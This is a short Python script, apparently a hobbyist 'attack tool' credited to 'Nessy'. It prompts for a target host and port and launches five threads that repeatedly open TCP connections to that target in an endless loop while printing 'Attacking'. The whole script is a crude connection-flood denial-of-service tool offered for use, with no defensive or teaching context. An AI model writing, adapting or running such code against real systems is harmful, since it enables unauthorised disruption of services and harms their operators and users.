import socket
import os
import sys
import threading
os.system("cls")
host = input("\nEnter host: ")
port = int(input("\nEnter port: "))
print("Tools By Nessy")
print("Starting Attack...")
print("\n")
def run(h):
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        print("Attacking " + host)
for i in range(5):
    t = threading.Thread(target=run, args=[i])
    t.start()
